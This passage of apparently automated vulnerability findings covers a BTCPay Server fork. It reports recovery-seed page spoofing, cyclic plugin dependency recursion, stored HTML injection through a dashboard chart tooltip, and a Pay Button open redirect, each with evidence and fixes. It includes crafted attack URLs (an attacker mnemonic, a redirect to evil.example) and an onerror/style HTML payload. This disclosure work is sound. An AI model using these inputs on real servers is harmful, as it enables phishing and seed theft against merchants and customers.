Authorization is [Authorize(Cookie, Policy = CanModifyStoreSettings)] with no storeId in the route, so PermissionAuthorizationHandler.Handle takes the anyScope branch and any user holding store-settings rights on any store passes — every self-registered user who created a store. Antiforgery does not apply to GET (UIControllerAntiforgeryTokenAttribute.ShouldValidate, lines 46-52). An anonymous attacker therefore sends such a user a link like https://<btcpay>/recovery-seed-backup?mnemonic=<attacker words>&isStored=true&requireConfirm=false&returnUrl=/stores/<id>/onchain/BTC/settings (an unauthenticated victim is bounced through login and lands on the same URL). The trusted BTCPay origin, in its own layout, then instructs the victim to treat an attacker-chosen phrase as their store's hot-wallet backup. A merchant who records it as their backup, or who imports the 'server hot wallet' seed into another wallet to manage or receive funds, ends up relying on an attacker-known seed. Output is Razor-encoded (@word, data-mnemonic), so there is no XSS; ReturnUrl is constrained by Url.EnsureLocal. This is content spoofing of a page whose sole purpose is to convey a critical secret; restricting the action to the POST path the application itself uses removes the cross-site vector.

## Evidence
1. [BTCPayServer/Controllers/UIHomeController.cs:191–196](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Controllers/UIHomeController.cs#L191-L196)
   RecoverySeedBackup is mapped with [Route("recovery-seed-backup")] and no HTTP-method constraint, and binds RecoverySeedBackupViewModel from the request (query string on GET, form on POST). Whatever mnemonic/passphrase/isStored/requireConfirm/returnUrl the request carries is passed straight to the view.
2. [BTCPayServer/Views/UIHome/RecoverySeedBackup.cshtml:38–75](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Views/UIHome/RecoverySeedBackup.cshtml#L38-L75)
   The view presents Model.Words as 'your recovery phrase' with instructions to write it down, and when IsStored is true states 'The recovery phrase will also be stored on the server as a hot wallet' -- all driven by request-supplied values with no binding to any wallet the user actually generated.
3. [BTCPayServer/Models/StoreViewModels/RecoverySeedBackupViewModel.cs:5–17](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Models/StoreViewModels/RecoverySeedBackupViewModel.cs#L5-L17)
   Plain settable properties bound by the default model binder; Words is derived from Mnemonic.
4. [BTCPayServer/Extensions.cs:1004–1020](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Extensions.cs#L1004-L1020)
   The legitimate flow (wallet generation / WalletSeed) reaches the page through an auto-submitting POST (PostRedirect) carrying the real mnemonic; the controller cannot distinguish that from a GET link crafted by a third party.
5. [BTCPayServer/Filters/UIControllerAntiforgeryTokenAttribute.cs:46–52](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Filters/UIControllerAntiforgeryTokenAttribute.cs#L46-L52)
   Antiforgery validation only applies to non-GET methods, so the GET variant is reachable from a cross-site link without any token.

## Impact
No data is disclosed and no server state changes; the integrity of a security-critical message from the server to the user is subverted, which can lead the merchant to keep a useless backup or to fund an attacker-known seed. Rated LOW integrity because the harm depends entirely on the victim's subsequent handling of the phrase outside the application.

## Reproduction steps
1. Attacker: anonymous, needs only to deliver a URL (email, chat, a PoS or crowdfund link). Victim: any logged-in user with CanModifyStoreSettings on some store (PermissionAuthorizationHandler anyScope branch; no storeId needed), which includes every self-registered user who owns a store. The victim opens the link and the trusted origin displays the attacker's words as their recovery phrase with the server's framing; for impact the victim must then act on it (record it as their backup, or import it elsewhere), so UI:ACTIVE. No deployment preconditions: the route, binder and policy are the shipped defaults.

## Recommended fix
The seed-display action accepts GET with a fully request-supplied model, so a third party can author the content of a page that the application presents as the user's own wallet secret. Fix criteria: The recovery-seed page must only display seeds produced by the server in the same flow: restrict the action to POST (antiforgery-protected, which is the only path the application uses) or, better, hand the seed over through short-lived server-side state (TempData / a protected one-time token) instead of request parameters. Verify: GET /recovery-seed-backup?mnemonic=... returns 404/405 and the generate-wallet and WalletSeed flows still show the seed once.

---
**Severity:** LOW
**Status:** Open
**Category:** Content spoofing
**CWE:** [CWE-451](https://cwe.mitre.org/data/definitions/451.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** NONE
**Privileges required:** NONE
**User interaction:** ACTIVE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** LOW
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/btcpayserver
**Branch:** main
**Commit:** 165bbbd3d1a2cfe1d463407b1fc172edb90c0586
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01T8kzaYNjL5FRBR7tZd6bAT&finding=scan_01PpWUp1JYcSoiTiFe8zzgGU-5257581

---

# Plugin install dependency resolution recurses without bound on cyclic manifest dependencies

## Details
UIPluginManagerController.InstallPlugin (POST server/plugins/install, admin-only) resolves a plugin's dependency closure by recursing through DownloadPluginAndDependencies. The intended cycle guard at line 190 (`if (ctx.Downloaded.Contains(ctx.Plugin) || ctx.DependencyFailed.ContainsKey(ctx.Plugin)) return;`) is ineffective for any plugin still on the recursion path, because a plugin is only added to `Downloaded` at line 238, after the foreach over `manifest.Dependencies` (205-235) has already awaited the recursive call for each unmet dependency (line 228). `Downloaded`/`DependencyFailed` are the same reference-typed collections in every `ctx with {...}` copy, so no per-level state breaks the cycle either.

The `Dependencies` array is taken verbatim from the plugin builder's `manifestInfo` JSON (PluginService.DownloadRemotePlugin line 166, AvailablePlugin.Dependencies line 253); the builder derives it from the plugin author's `IBTCPayServerPlugin.Dependencies` (PluginPacker serializes the plugin instance). If plugin A's manifest lists a dependency on A itself with any condition a published version satisfies (or none: ParseCondition defaults to `Yes`), or A and B list each other, then at every level `PluginManager.DependencyMet` is false (A is not in `pluginService.Installed`, a dictionary built once in the PluginService constructor at line 34 from the plugins loaded at startup, so it can never flip to true mid-resolution), the identifier is not "BTCPayServer", the parsed condition is not `Not`, and the code recurses with `Plugin = A`, `Version = null`. The child again finds `Downloaded` empty, calls `DownloadRemotePlugin(A, null, cond)` — three HTTP requests to the builder plus rewriting `PluginDir/A.btcpay` and `PluginDir/A.json` with FileMode.Create — and repeats. Nothing bounds depth or iteration count, and no CancellationToken (HttpContext.RequestAborted or otherwise) is passed into DownloadRemotePlugin or the PluginBuilderClient calls, so the loop continues after the admin's browser gives up. `CancelCommands` cannot stop it: no command is ever queued because line 237 is never reached.

The loop ends only when the builder fails a request (rate limit, outage) or the process restarts. On a builder failure `DependencyFailed.Add(A, …)` runs at the deepest level (line 201) and the parent's `ctx.DependencyFailed.Add(ctx.Plugin /* also A */, …)` at line 231 throws ArgumentException (duplicate key), which propagates through every frame as an unhandled 500 instead of the status message.

Impact: the admin's install request never completes; the server performs an unbounded stream of builder downloads and file rewrites and retains one async frame plus one deserialized manifest per level for as long as the builder answers; the rest of the server keeps serving because the work is asynchronous. The plugin is never installed or loaded.

Attacker: whoever authors the manifest the configured PluginSource serves — the plugin-builder operator (threat-model adversary 6), a MITM on a plaintext PluginSource (http:// is accepted by ConfigurePluginBuilderClient), or a third-party author publishing a self/mutually-dependent manifest to the public builder, which any admin may then try to install. The defect is in core install-path code and fires before any plugin assembly is downloaded to completion, loaded or trusted, so the 'installed plugins are fully trusted' concession does not cover it; the project's own DownloadRemotePlugin identifier/version checks (lines 168-171) and the test DownloadRemotePlugin_RejectsManifestIdentifierMismatch show builder manifest metadata is treated as untrusted on this surface. A benign accidental dependency cycle between two legitimate plugins triggers the same behaviour.

## Evidence
1. [BTCPayServer/Plugins/PluginManager/Controllers/UIPluginManagerController.cs:188–239](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/PluginManager/Controllers/UIPluginManagerController.cs#L188-L239)
   DownloadPluginAndDependencies: the cycle guard at line 190 checks ctx.Downloaded, but ctx.Downloaded.Add(ctx.Plugin) is only executed at line 238, after the foreach over manifest.Dependencies (205-235) has already awaited the recursive call at line 228. A manifest whose Dependencies names the plugin itself, or two manifests naming each other, never satisfies the guard and recurses indefinitely. Downloaded/DependencyFailed are reference-typed collections shared through the `ctx with {...}` record copy (216-221), so no per-level copy breaks the cycle. On eventual builder failure line 231 re-Adds the same key and throws ArgumentException.
2. [BTCPayServer/Plugins/PluginManager/Controllers/UIPluginManagerController.cs:136–166](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/PluginManager/Controllers/UIPluginManagerController.cs#L136-L166)
   InstallPlugin POST is the entry point: it builds the root DownloadPluginContext from the admin's plugin/version and awaits DownloadPluginAndDependencies with no depth or iteration bound and no cancellation token, so the request never completes while the recursion runs and the work survives the client disconnecting.
3. [BTCPayServer/Plugins/PluginManager/PluginService.cs:145–179](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/PluginManager/PluginService.cs#L145-L179)
   Each recursion level calls DownloadRemotePlugin, which performs three HTTP round-trips to the plugin builder (versions list, manifest, archive download) with no CancellationToken and rewrites <id>.btcpay and <id>.json under PluginDir with FileMode.Create. The manifest's Dependencies array (AvailablePlugin.Dependencies, line 253) is taken verbatim from the builder's ManifestInfo JSON (line 166) and is the attacker-controlled input; the identifier/version checks at 168-171 show builder metadata is otherwise treated as untrusted here.
4. [BTCPayServer/Plugins/PluginManager/PluginService.cs:34](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/PluginManager/PluginService.cs#L34)
   Installed is built once in the constructor from the plugins loaded at startup and is never updated during dependency resolution, so DependencyMet for a not-yet-installed (or installed-at-unsatisfying-version) plugin stays false at every recursion level.
5. [BTCPayServer/Plugins/PluginManager.cs:650–656](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/PluginManager.cs#L650-L656)
   DependencyMet returns false whenever the dependency identifier is not in Installed (unless the condition is Not), so a self-dependency on a plugin that is not yet installed is always 'unmet' and always triggers the recursive download branch.

## Impact
No data is disclosed. Integrity impact is limited to repeatedly rewriting the pending <id>.btcpay/<id>.json files for the same identifier under PluginDir, which the admin intended to write anyway; no install command is queued and no plugin code runs. Availability: the install request hangs, the work continues after the client disconnects (no cancellation token), the admin cannot stop it from the UI, and the process accumulates one async frame and one deserialized manifest per level plus continuous outbound HTTP and file I/O for as long as the builder keeps answering; growth rate is bounded by the builder's response latency and manifest size, and the rest of the server keeps serving because the work is asynchronous, so availability is rated LOW rather than HIGH.

## Reproduction steps
1. The attacker publishes (or, as the builder operator or an http MITM, serves) a plugin manifest whose Dependencies references itself or a partner plugin with a satisfiable (or absent) version condition. A server admin opens the Plugin Directory and clicks Install on it (UI:ACTIVE); the POST to server/plugins/install (admin-only, antiforgery-protected) then recurses without bound and cannot be cancelled from the UI. The attacker needs no account on the victim server (PR:NONE) but depends on the admin choosing that plugin and on the victim's PluginSource serving the attacker's manifest (AT:PRESENT). No security mechanism must be defeated (AC:LOW).

## Recommended fix
1. The visited-set guard in DownloadPluginAndDependencies records a plugin as downloaded only after its dependency subtree has been fully recursed, so cyclic dependency graphs never hit the guard and recursion is unbounded. Fix criteria: Dependency resolution must terminate on any dependency graph the builder can return: a plugin currently being resolved (on the recursion path) must be detected and treated as a failure or skipped before its manifest is downloaded again, and/or an explicit depth or total-download bound must abort resolution with a user-visible error. Verify by installing a manifest that depends on itself (and an A<->B pair) against a stub builder: the request must complete with an error after a bounded number of builder requests and no duplicate-key exception.
2. The failure path assumes each plugin fails at most once; when a child and its parent share an identifier the second DependencyFailed.Add throws ArgumentException instead of recording the failure. Fix criteria: Recording a dependency failure must be idempotent (TryAdd or indexer assignment) so the error is reported to the admin via the status message instead of an unhandled 500.

---
**Severity:** LOW
**Status:** Open
**Category:** Uncontrolled Recursion
**CWE:** [CWE-674](https://cwe.mitre.org/data/definitions/674.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** NONE
**User interaction:** ACTIVE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** NONE
**Vulnerable system availability impact:** LOW
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/btcpayserver
**Branch:** main
**Commit:** 165bbbd3d1a2cfe1d463407b1fc172edb90c0586
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01T8kzaYNjL5FRBR7tZd6bAT&finding=scan_01PpWUp1JYcSoiTiFe8zzgGU-5257576

---

# Stored HTML injection: app item titles reach the store dashboard's Top Items tooltip via innerHTML (Chartist tooltip2 {{meta}})

## Details
A second sink for the unsanitized app item title already recorded in template-editor-vhtml-item-title-stored-xss (TemplateEditor v-html); here the title reaches a different innerHTML on the store Dashboard. The originally filed mechanism (Chartist axis labels rendered via innerHTML) does not hold for the vendored Chartist 0.11.4: Chartist.createLabel creates a <span>, sets span.innerText = label and passes the element to Svg.foreignObject, so the string/innerHTML branch is never used for labels. The real sink is the vendored, project-modified tooltip plugin.

Flow: the store Dashboard (Views/UIStores/Dashboard.cshtml:92-94) renders the AppTopItems view component for every PoS/Crowdfund app. Its script fetches GET /apps/{appId}/dashboard/app-top-items, JSON.parses the <template> containing @Safe.Json(Model) (Default.cshtml:24-44; Safe.Json is IJsonHelper.Serialize, no sanitization) and calls dataLoaded, which builds labels = entries.map(e => e.title) and series = salesCount (integers) and constructs Chartist.Bar with distributeSeries:true and Chartist.plugins.tooltip2({ template: '<div class="chartist-tooltip-inner">{{meta}} - Sales: {{value}}</div>' }) (Default.cshtml.js:6-24). In chartist-plugin-tooltip.js showTooltip, because each distributed series item is a bare number, line 204 sets itemData = { value: seriesData, meta: chart.data.labels[seriesIndex] } — i.e. meta is the raw item title — line 233 string-replaces {{meta}} with it and line 238 executes tooltipElement.innerHTML = textMarkup on an element appended to document.body. The tooltip is shown on mouseover of any bar (.ct-bar) of the Top Items / Top Perks chart.

Source: the title is the merchant-authored PoS item or crowdfund perk title (PointOfSalePlugin.cs:105, CrowdfundPlugin.cs:110: Title = item?.Title ?? itemCode). AppService.Parse only validates ids (AppService.cs:355-366), and both the UI editors and Greenfield PUT /api/v1/apps/pos|crowdfund/{appId} (GreenfieldAppsController.cs:346, 380) store the title verbatim. An item appears in the widget once it has at least one paid invoice, which the hostile owner produces trivially (pay their own PoS invoice, or mark it settled via ChangeInvoiceState, CanManageInvoiceStatus, which Owner holds). The project's sanctioned rendering of the same Title field passes it through HtmlSanitizer (Safe.Raw in the public PoS Static view), so raw HTML from titles is not something the project concedes.

Attacker position: a store member holding CanModifyStoreSettings (default Owner role) or an API key scoped to btcpay.store.canmodifystoresettings for the store. Victims: other holders of CanModifyStoreSettings on the store who open the Dashboard and hover a bar of the chart — co-Owners, and server administrators who are Owners of the store (the common pattern where the admin provisions the store); an API-key holder's payload runs in the full cookie session of the Owner. The Dashboard and widget endpoint require CanModifyStoreSettings via cookie (UIStoresController.Dashboard.cs:23, UIAppsController.Dashboard.cs:13).

Control present: the global AntiXSS CSP (Startup.cs:166-167, ContentSecurityPolicyAttribute.cs:22-28) emits only script-src 'self' + hashes, so inline <script>/on* handlers inserted via innerHTML do not execute. Everything else does: an injected <style> (style elements apply document-wide even inside the later-hidden tooltip and can override the [hidden] UA rule), a fixed full-page <iframe>/overlay impersonating a BTCPay login or 2FA prompt on the genuine origin, <meta http-equiv=refresh> redirecting the viewer, <base href>, external stylesheets. Impact is stored HTML injection / UI redress against equal- or higher-privileged users of the administrative UI, not script execution. The fix is independent of the TemplateEditor one: titles must be HTML-escaped before being used as chart labels/tooltip meta (or the tooltip plugin must insert meta as text).

## Evidence
1. [BTCPayServer/Components/AppTopItems/Default.cshtml.js:6–23](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Components/AppTopItems/Default.cshtml.js#L6-L23)
   labels = model.entries.map(e => e.title) (raw item/perk titles) and series = model.salesCount (plain integers) are handed to Chartist.Bar with distributeSeries:true and the tooltip2 plugin whose template is '<div class="chartist-tooltip-inner">{{meta}} - Sales: {{value}}</div>'. No escaping of the title occurs here. (The Chartist 0.11.4 axis labels themselves are NOT a sink: createLabel sets span.innerText and passes the element to foreignObject.)
2. [BTCPayServer/wwwroot/vendor/chartist/chartist-plugin-tooltip.js:198–238](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/wwwroot/vendor/chartist/chartist-plugin-tooltip.js#L198-L238)
   Sink (project-modified vendored plugin). For a numeric distributed series item, line 204 builds itemData = { value, meta: chart.data.labels[seriesIndex] } so meta is the raw title; line 233 substitutes it into the template string ({{meta}}) and line 238 does tooltipElement.innerHTML = textMarkup. The tooltip element is appended to document.body (line 303) and shown on mouseover of any .ct-bar (getDefaultTriggerClass).
3. [BTCPayServer/Components/AppTopItems/Default.cshtml:24–43](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Components/AppTopItems/Default.cshtml#L24-L43)
   The initial render fetches DataUrl (/apps/{appId}/dashboard/app-top-items), swaps in the response, JSON.parses the <template> that contains @Safe.Json(Model) (Entries with raw Title; Safe.Json is IJsonHelper.Serialize with no HTML sanitization) and calls window.appTopItems.dataLoaded, reaching the sink. The server-side @entry.Title at line 51 is Razor-encoded and safe.
4. [BTCPayServer/Plugins/PointOfSale/PointOfSalePlugin.cs:105](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/PointOfSale/PointOfSalePlugin.cs#L105)
   AppItemStats.Title = item?.Title ?? itemCode: the PoS item title comes verbatim from the merchant-authored template for every item that has at least one paid invoice.
5. [BTCPayServer/Plugins/Crowdfund/CrowdfundPlugin.cs:107–111](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Crowdfund/CrowdfundPlugin.cs#L107-L111)
   Same for crowdfund perks: Title = perk?.Title ?? itemCode from the merchant-authored PerksTemplate.
6. [BTCPayServer/Services/Apps/AppService.cs:355–365](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Services/Apps/AppService.cs#L355-L365)
   Parse validates only ids (missing/duplicate); Title is deserialized and re-serialized unchanged on every writer path (UI editors and Greenfield PUT /api/v1/apps/pos|crowdfund/{appId}, GreenfieldAppsController.cs:346, 380).
7. [BTCPayServer/Controllers/UIAppsController.Dashboard.cs:13–23](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Controllers/UIAppsController.Dashboard.cs#L13-L23)
   The widget data endpoint requires CanModifyStoreSettings via cookie, the same policy as the store Dashboard (UIStoresController.Dashboard.cs:23): victims are co-members holding that permission (default Owner role, including server admins who are Owners of the store).
8. [BTCPayServer/Views/UIStores/Dashboard.cshtml:92–93](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Views/UIStores/Dashboard.cshtml#L92-L93)
   The store dashboard (the store landing page) renders vc:app-top-items for every PoS/Crowdfund app of the store, so the chart and its tooltip are built whenever the dashboard is opened.
9. [BTCPayServer/Filters/ContentSecurityPolicyAttribute.cs:22–27](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Filters/ContentSecurityPolicyAttribute.cs#L22-L27)
   The shipped AntiXSS CSP sets only script-src 'self' (+ sha256 hashes); no default-src, style-src, frame-src, form-action or base-uri. Inline script/handlers inserted via innerHTML are blocked, but <style>, <iframe>, <meta http-equiv=refresh>, <base>, <form>/<button formaction> take effect.

## Impact
With the shipped CSP intact no script executes, so there is no direct session takeover. The attacker gains arbitrary non-script HTML on the authenticated store Dashboard shown to co-Owners / member server admins: persistent <style>, full-page iframe or overlay impersonating a login/2FA prompt on the genuine origin (credential phishing), meta-refresh redirect, injected links/forms. Page integrity is compromised (LOW) and the phishing primitive is a limited confidentiality exposure (LOW); no availability impact.

## Reproduction steps
1. Attacker: a store Owner (any self-registered user can create a store) or an API key with CanModifyStoreSettings saves a PoS item or crowdfund perk whose title is HTML and ensures one paid invoice references it. A co-member holding CanModifyStoreSettings (co-Owner, or a server admin who is an Owner of the store) opens the store Dashboard and hovers a bar of the Top Items chart; the tooltip plugin inserts the title via innerHTML in their authenticated session. No CSP bypass is needed for the HTML/UI-redress payloads because the shipped policy restricts only script-src (AC:LOW). Requires that such a co-member exists in the attacker's store (AT:PRESENT) and that they hover the chart (UI:ACTIVE).

## Recommended fix
1. Merchant-authored item/perk titles are passed as Chartist labels and the vendored tooltip2 plugin substitutes chart.data.labels[seriesIndex] into an HTML template that is assigned to innerHTML. Fix criteria: Titles must be HTML-escaped (or sanitized with the project's HtmlSanitizer) before being used as chart labels/tooltip meta in AppTopItems/Default.cshtml.js, or the tooltip plugin must insert {{meta}}/{{value}} as text nodes rather than through innerHTML. Verify by saving an item titled <img src=x onerror=alert(1)><style>body{background:red}</style>, paying one invoice for it, opening the store Dashboard and hovering its bar: the DOM must contain no element created from the title.
2. Item titles are stored verbatim by every writer path (UI editors and Greenfield PUT) with no server-side sanitization, so each new consumer must defend itself. Fix criteria: Sanitize or escape item/perk titles once at storage time (AppService.Parse / the app update paths) so that stored titles cannot contain active HTML; existing consumers (TemplateEditor v-html, dashboard tooltip) then render safely.

---
**Severity:** LOW
**Status:** Open
**Category:** Cross-site scripting
**CWE:** [CWE-79](https://cwe.mitre.org/data/definitions/79.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** LOW
**User interaction:** ACTIVE
**Vulnerable system confidentiality impact:** LOW
**Vulnerable system integrity impact:** LOW
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/btcpayserver
**Branch:** main
**Commit:** 165bbbd3d1a2cfe1d463407b1fc172edb90c0586
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01T8kzaYNjL5FRBR7tZd6bAT&finding=scan_01PpWUp1JYcSoiTiFe8zzgGU-5257574

---

# Anonymous Pay Button browserRedirect stored on invoice enables open redirect from the BTCPay domain

## Details
Sibling of the verified finding pos-payer-controlled-redirecturl-open-redirect, in a module that finding does not cover. The Pay Button endpoint `GET|POST /api/v1/invoices` (UIPublicPayButtonController.cs:33-48) is anonymous, CORS-open and antiforgery-exempt for any store with `AnyoneCanInvoice` enabled. It binds `BrowserRedirect` from the request and sets `Checkout.RedirectURL = model.BrowserRedirect ?? store.StoreWebsite` (lines 78-82). The only check is the `[Url]` data annotation (PayButtonViewModel.cs:35-36), which merely requires an http/https/ftp prefix. `CreateInvoiceCoreRaw` stores it as `RedirectURLTemplate` (UIInvoiceController.cs:201) and `InvoiceEntity.RedirectURL` accepts any absolute http/https URI (InvoiceEntity.cs:496-505).

The stored URL is then used by the anonymous invoice pages exactly as in the PoS case: rendered as the merchant's 'Return to <StoreName>' button on checkout and receipt pages, followed automatically via `window.top.location` after settlement when the store sets RedirectAutomatically (checkout.js:234-242), and returned as a server-side 302 from `/i/{id}/receipt` when the store disabled receipts (UIInvoiceController.UI.cs:211-216).

What differs from the PoS finding: (a) the GET variant makes the attack a single trusted-domain link — `https://<btcpay>/api/v1/invoices?storeId=<id>&price=10&currency=USD&browserRedirect=https://evil.example/` creates the invoice on the victim's own request and 302s them straight into the genuine checkout whose 'Return to store' now points at the attacker; (b) the precondition is the store-level Pay Button opt-in (`AnyoneCanInvoice`), not an app. The maintainers' warning on the Pay Button settings page ('order relevant information can be modified by the user', Enable.cshtml:19-24) acknowledges payer control of order data, but a redirect target on the trusted domain is a phishing vector against the merchant's customers, not order data.

The `ServerIpn` parameter on the same request (NotificationURLTemplate) was examined and is not part of this finding: the IPN sender uses the SSRF-guarded 'bitpay-ipn' named client and only posts data the attacker supplied.

## Evidence
1. [BTCPayServer/Plugins/PayButton/Controllers/UIPublicPayButtonController.cs:80](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/PayButton/Controllers/UIPublicPayButtonController.cs#L80)
   The anonymous request's BrowserRedirect becomes the invoice's Checkout.RedirectURL, taking precedence over the merchant's StoreWebsite (used only when absent); no comparison with the store website, the BTCPay origin or any merchant allow-list. This is the line the fix must change.
2. [BTCPayServer/Plugins/PayButton/Controllers/UIPublicPayButtonController.cs:33–64](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/PayButton/Controllers/UIPublicPayButtonController.cs#L33-L64)
   Both GET and POST /api/v1/invoices are unauthenticated (no [Authorize]), CORS-open and antiforgery-exempt; the only gate is the target store's AnyoneCanInvoice flag (lines 55-57) and the PublicInvoices rate limit (4 r/min, Startup.cs:307), which does not stop a single creation. The GET variant lets one trusted-domain link create the invoice and 302 the victim into the checkout (line 120).
3. [BTCPayServer/Plugins/PayButton/Models/PayButtonViewModel.cs:35–36](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/PayButton/Models/PayButtonViewModel.cs#L35-L36)
   [Url] is System.ComponentModel.DataAnnotations.UrlAttribute (net10.0), which only requires an http://, https:// or ftp:// prefix; any external host passes.
4. [BTCPayServer/Controllers/UIInvoiceController.cs:201](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Controllers/UIInvoiceController.cs#L201)
   Stored on the invoice as RedirectURLTemplate after Trim() only; RedirectAutomatically (line 198) falls back to the store setting since the Pay Button does not set it.
5. [BTCPayServer/Services/Invoices/InvoiceEntity.cs:496–504](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Services/Invoices/InvoiceEntity.cs#L496-L504)
   RedirectURL getter accepts any absolute http/https URI; only the scheme is checked.
6. [BTCPayServer/Controllers/UIInvoiceController.UI.cs:211–215](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Controllers/UIInvoiceController.UI.cs#L211-L215)
   Anonymous GET /i/{id}/receipt performs a server-side 302 to the stored URL when the store has receipts disabled; ValidateAccessToInvoice (line 1343) allows anonymous access for a month past monitoring expiry.
7. [BTCPayServer/Controllers/UIInvoiceController.UI.cs:927–929](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Controllers/UIInvoiceController.UI.cs#L927-L929)
   Default configuration: the checkout model exposes the stored URL as MerchantRefLink together with RedirectAutomatically.
8. [BTCPayServer/wwwroot/checkout/checkout.js:186–190](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/wwwroot/checkout/checkout.js#L186-L190)
   merchantRefLink becomes storeLink, rendered as the 'Return to <StoreName>' button on the trusted checkout page (Checkout.cshtml:148,182,219) and, when the store sets RedirectAutomatically, assigned to window.top.location after settlement (lines 234-242).
9. [BTCPayServer/Views/UIInvoice/InvoiceReceipt.cshtml:192–194](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Views/UIInvoice/InvoiceReceipt.cshtml#L192-L194)
   Receipt page (default: enabled) renders the stored URL as the 'Return to <StoreName>' link on the BTCPay domain.

## Impact
Trust in the merchant's payment domain is abused to send customers to attacker content (impersonating the merchant or BTCPay, 'payment failed, retry here'). No server data is read or modified beyond the attacker's own invoice fields.

## Reproduction steps
1. Unauthenticated attacker crafts one GET (or POST) to /api/v1/invoices for a store that enabled the Pay Button (AnyoneCanInvoice, non-default store setting, hence AT:PRESENT) with browserRedirect pointing at their host, then sends the trusted-domain link (either the creating GET itself or the resulting /i/{id} or /i/{id}/receipt URL) to victims. Opening the link suffices; on receipts-disabled stores the receipt URL is a server-side 302.

## Recommended fix
An anonymous request parameter on the public Pay Button endpoint is persisted as the invoice's redirect target and later used for server-side redirects and trusted-page links without restriction to merchant-approved destinations. Fix criteria: browserRedirect from anonymous Pay Button requests must be ignored or restricted to destinations the merchant controls (same origin as StoreWebsite or the BTCPay origin, or a merchant-configured allow-list); /i/{id} and /i/{id}/receipt must never 302 to, and checkout/receipt pages never link to, an unapproved host. Verify by creating a Pay Button invoice with browserRedirect=https://evil.example and confirming no checkout, receipt or redirect response references that host.

---
**Severity:** LOW
**Status:** Open
**Category:** Open redirect
**CWE:** [CWE-601](https://cwe.mitre.org/data/definitions/601.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** NONE
**User interaction:** PASSIVE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** LOW
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/btcpayserver
**Branch:** main
**Commit:** 165bbbd3d1a2cfe1d463407b1fc172edb90c0586
**Date created:** 2026-10-18
